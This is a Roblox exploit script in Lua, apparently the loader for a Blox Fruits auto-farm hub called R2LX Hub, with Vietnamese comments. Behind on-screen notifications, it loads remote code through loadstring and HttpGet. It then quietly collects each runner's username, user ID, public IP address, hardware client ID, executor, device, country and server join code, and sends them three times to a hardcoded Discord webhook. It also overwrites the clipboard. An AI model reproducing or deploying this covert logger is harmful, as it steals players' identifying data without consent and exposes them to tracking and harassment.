_G.HoHoLoaded = true
notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Notification.lua"))()
local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

wait(1)
Notification:Notify(
   {Title = "R2lx Hub", Description = "R2LX HUB"},
   {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "option"},
   {Image = "http://www.roblox.com/asset/?id=72839129717682", ImageColor = Color3.fromRGB(255, 84, 84), Callback = function(State) print(tostring(State)) end}
)
notify.New("Project Main 1.0", 60)
notify.New("by R2LX and (cayngaydem) and T & Version X_X", 60)

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**R2LX HUB Phiên Bản : Test**",
                ["description"] ="",
                ["type"] = "rich",
                ["color"] = tonumber(0xf93dff),
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm", AdminLoggerMsg()) -- Post to admin webhook

-- 🛠 Xác định Executor
-- 📌 Lấy thông tin thiết bị
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
end

-- 📌 Xác định Executor
local executor = "Unknown"
local isMobile = false
local isIOS = false
local isAndroid = false

if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif secure_load then
    executor = "Sentinel"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif getexecutorname then
    executor = getexecutorname()
elseif is_synapse_function then
    executor = "Synapse X (Detected by Function)"
elseif (getgenv and debug and debug.getinfo) then
    executor = "Possible PC Executor"
elseif (writefile and readfile) then
    executor = "Possible Mobile Executor"
    
-- 📌 Executor dành cho iOS
elseif (protect_gui and isfile) then
    executor = "Delta (iOS)"
    isMobile = true
    isIOS = true
elseif (hookfunction and getnamecallmethod) then
    executor = "ScriptWare (iOS & PC)"
    isMobile = true
    isIOS = true
elseif (isnetworkowner and islclosure) then
    executor = "Arceus X (iOS)"
    isMobile = true
    isIOS = true
elseif (getrawmetatable and setreadonly) then
    executor = "Magma Executor (iOS)"
    isMobile = true
    isIOS = true

-- 📌 Executor dành cho Android
elseif (protect_gui and isfile) then
    executor = "Delta (Android)"  -- Thêm executor Delta cho Android
    isMobile = true
    isAndroid = true
elseif (isexecutor and isfile) then
    executor = "Electron (Android)"
    isMobile = true
    isAndroid = true
elseif (isfile and readfile and writefile) then
    executor = "Fluxus Mobile (Android)"
    isMobile = true
    isAndroid = true
elseif (isnetworkowner and islclosure) then
    executor = "Arceus X (Android)"
    isMobile = true
    isAndroid = true

-- 📌 Executor khác
elseif (syn and syn.request) then
    executor = "Synapse X (PC)"
elseif (secure_call and syn) then
    executor = "Comet (PC)"
elseif (firetouchinterest and syn) then
    executor = "Celestial (PC)"
end

-- 📌 Xác định chính xác loại thiết bị
if isMobile then
    if isIOS then
        deviceType = "Mobile (iOS)"
    elseif isAndroid then
        deviceType = "Mobile (Android)"
    else
        deviceType = "Mobile (Unknown OS)"
    end
end

-- 📌 Lấy thông tin nhân vật
local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
local avatarLink = "https://www.roblox.com/users/" .. userId .. "/profile"

-- 📌 Lấy Hardware Key (Client ID)
local hardwareKey = "Unknown"
pcall(function()
    hardwareKey = game:GetService("RbxAnalyticsService"):GetClientId()
end)

-- 📌 Lấy thông tin thiết bị (SỬA LỖI)
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
elseif syn or is_sirhurt_closure or secure_load or getexecutorname or isnetworkowner then
    deviceType = "PC"  -- Nếu dùng các executor phổ biến cho PC, xác định là PC
elseif protect_gui or isfile or hookfunction or islclosure then
    deviceType = "Mobile"  -- Nếu có các hàm executor trên iOS/Android, xác định là Mobile
end

-- 📌 Lấy thông tin tài khoản
local accountAge = player.AccountAge
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

-- 📌 Lấy thông tin về "Sea" (Thế giới)
local seaName = "Unknown"
if game.PlaceId == 2753915549 then -- Place ID cho Sea 1
    seaName = "Sea 1"
elseif game.PlaceId == 4442272183 then -- Place ID cho Sea 2
    seaName = "Sea 2"
elseif game.PlaceId == 7449423635 then -- Place ID cho Sea 3
    seaName = "Sea 3"
else
    seaName = "Unknown Sea"
end

-- 📌 Lấy số lượng người chơi hiện tại trong server
local playerCount = #game.Players:GetPlayers()  

-- 📌 Số người chơi tối đa cố định là 12
local maxPlayers = 12  

-- 📌 Kiểm tra xem người chơi có ở server VIP hay không
-- 📌 Kiểm tra xem người chơi có ở server VIP hay không
local isVIPServer = false

-- Kiểm tra xem có phải server VIP không
if game.PrivateServerId ~= "" and game.PrivateServerId ~= "00000000-0000-0000-0000-000000000000" then
    isVIPServer = true
end

-- 📌 Lấy IP Address
local ipAddress = "Unknown"
pcall(function()
    ipAddress = game:HttpGet("https://api.ipify.org", true)
end)

-- 📌 Lấy Job ID
local jobId = game.JobId

-- 📌 Tạo Join Code
local joinCode = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. jobId .. "')"

-- 📌 Hàm sinh màu ngẫu nhiên
local function generateRandomColor()
    return tonumber(string.format("0x%02X%02X%02X", math.random(0, 255), math.random(0, 255), math.random(0, 255)))
end

-- 📌 Lấy HttpService
local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"


-- 📌 Gửi thông báo lên Webhook Discord (SỬA LỖI TÊN THIẾT BỊ)
local function guiThongBaoDiscord()
    local randomColor = generateRandomColor()  

    local response = request({
        Url = Webhook_URL,
        Method = 'POST',
        Headers = { ['Content-Type'] = 'application/json' },
        Body = HttpService:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "**Script Đã Được Chạy!**",
                ["description"] = "**" .. displayName .. "** đã chạy script.",
                ["type"] = "rich",
                ["color"] = randomColor,  
                ["thumbnail"] = { ["url"] = avatarUrl },  
                ["fields"] = {
                    {
                        ["name"] = "👤 Tên nhân vật:",
                        ["value"] = username .. " (" .. displayName .. ")",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 User ID:",
                        ["value"] = tostring(userId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "⚡ Executor:",
                        ["value"] = executor,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📱 Tên thiết bị:",
                        ["value"] = deviceType,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📅 Tuổi tài khoản:",
                        ["value"] = tostring(accountAge) .. " ngày",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🎮 Tên trò chơi:",
                        ["value"] = gameName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 Game ID:",
                        ["value"] = tostring(gameId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🔑 Hardware Key:",
                        ["value"] = hardwareKey,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌍 Thế giới (Sea):",
                        ["value"] = seaName,
                        ["inline"] = false
                    },                    
                    {
                        ["name"] = "👥 Số người chơi trong server:",
                        ["value"] = tostring(playerCount) .. "/12",  -- Luôn hiển thị /12
                        ["inline"] = true
                    },                    
                    {
                        ["name"] = "🌍 Server VIP/Thường:",
                        ["value"] = isVIPServer and "VIP Server" or "Server Thường",  -- Thêm thông báo Server VIP/Thường
                        ["inline"] = true
                    },                    
                    {
                        ["name"] = "🌍 IP Address:",
                        ["value"] = ipAddress,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Job ID:",
                        ["value"] = jobId,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Join Code:",
                        ["value"] = "```lua\n" .. joinCode .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "⏰ Thời gian gửi:",
                        ["value"] = currentTime,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Link Avatar:",
                        ["value"] = avatarLink,
                        ["inline"] = false
                    }
                }
            }}
        })
    })
end

-- 🔥 Gửi thông báo khi script chạy
guiThongBaoDiscord()

-- 📌 Hiển thị thông báo trên Roblox
game.StarterGui:SetCore("SendNotification", {
    Title = "Executor",
    Text = "Bạn đang dùng: " .. executor,
    Duration = 5
})

-- 📌 Hiển thị thông báo trên Roblox về server VIP/Thường
local serverStatusMessage = isVIPServer and "Bạn đang ở **Server VIP**" or "Bạn đang ở **Server Thường**"

game.StarterGui:SetCore("SendNotification", {
    Title = "Server Status",
    Text = serverStatusMessage,
    Duration = 5
})

local LocalizationService = game:GetService("LocalizationService")
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local le = (game:GetService("Players").LocalPlayer.Data.Level.Value)
local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
local data = {
    embeds = {
        {
            title = "R2lx New Player",
            url = "https://www.roblox.com/users/" .. player.UserId,
            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
            color = tonumber(0xffa500),
            author = {
                name = "Admin: R2LX and Enc and (cayngaydem)",
                url = "https://cdn.discordapp.com/attachments/1226454597724409936/1233430491953107086/Screenshot_2024-04-20-17-04-30-945_com.zing.zalo-edit.jpg?ex=662d1129&is=662bbfa9&hm=345e588812e5489a8219d6939a7b94487e79f1153c99523094d207a830f2ccee&",
                icon_url = "https://cdn.discordapp.com/attachments/1226454597724409936/1233430491953107086/Screenshot_2024-04-20-17-04-30-945_com.zing.zalo-edit.jpg?ex=662d1129&is=662bbfa9&hm=345e588812e5489a8219d6939a7b94487e79f1153c99523094d207a830f2ccee&"
            },
            image = {
            	url = "https://cdn.discordapp.com/attachments/1229077309194113094/1233391929983504394/320688412_5524593467666764_7520827848036533185_n.gif?ex=662ced3f&is=662b9bbf&hm=25bf897861b49dc4d4e1320aa246bb05f9c5ba67d2a745106b9e0ad159981a55&"
            },
            footer = {
                text = "R2lx Hub | Created by: Ari | https://discord.com/invite/E6ffTF57RG | Time: " .. os.date("%Y-%m-%d %H:%M:%S VN"),
                icon_url = "https://discord.com/channels/1223639038724935680/1236316401640411237/1358066394746327122"
            },
            fields = {
                {
                    name = "ᴄᴏᴜɴᴛʀʏ🌐",
                    value = "```" .. code .. "```",
                    inline = true
                },
                {
                    name = "ᴀɢᴇ📆",
                    value = "```" .. player.AccountAge .. " Days```",
                    inline = true
                },
                {
                    name = "ᴇxᴇᴄᴜᴛᴏʀ💬",
                    value = "```" .. identifyexecutor() .. "```",
                    inline = true
                },
                {
                    name = "ʟᴇᴠᴇʟ🆙:",
                    value = "```" .. le .. "```",
                    inline = true
                },
                {
                    name = "ᴊᴏʙ ɪᴅ:",
                    value = "```".. tostring(game.JobId) .."```",
                    inline = true
                },
                {
                    name = "sᴛᴀᴛᴜs❗",
                    value = "```Người Dùng Đã Dùng Script Auto Farm Blox Fruit Cảm Ơn Bạn!!!```",
                    inline = true
                }
            }
        }
    }
}

local jsonData = HttpService:JSONEncode(data)
local webhookUrl = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"
local headers = {["Content-Type"] = "application/json"}
request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
local request = http_request or request or HttpPost or syn.request
local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}

local success, response = pcall(request, final)
if success then
    print("Profile information sent to Discord.")
else
    print("Failed to send profile information to Discord: " .. response)
end

setclipboard("https://discord.gg/wEUppgfJ")